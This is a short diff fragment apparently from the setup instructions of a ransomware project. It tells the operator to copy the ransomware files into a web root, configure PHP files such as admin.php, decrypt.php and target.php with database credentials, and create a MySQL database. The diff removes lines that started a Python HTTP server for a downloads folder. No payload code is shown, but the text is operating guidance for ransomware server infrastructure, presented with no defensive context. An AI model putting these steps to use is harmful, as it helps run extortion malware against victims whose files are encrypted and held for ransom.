@@ -40,9 +40,7 @@
  - > Copy all of the ransomware files to /var/www/html
  - > You should have all of the php files in the root of your web dir (/var/www/html/)
  - > You should also have /var/www/html/images/ and /var/www/html/scripts/
- - $ cd /var/www/html/downloads
- - $ python -m SimplHTTPServer 8080 &
- - $ cd ../
+ - $ cd /var/www/html/
  - > Modify admin.php, admin_query.php, decrypt.php, query.php, and target.php with your database information
  - > Next, create the database for storing the data
  - $ mysql -u [user] -p
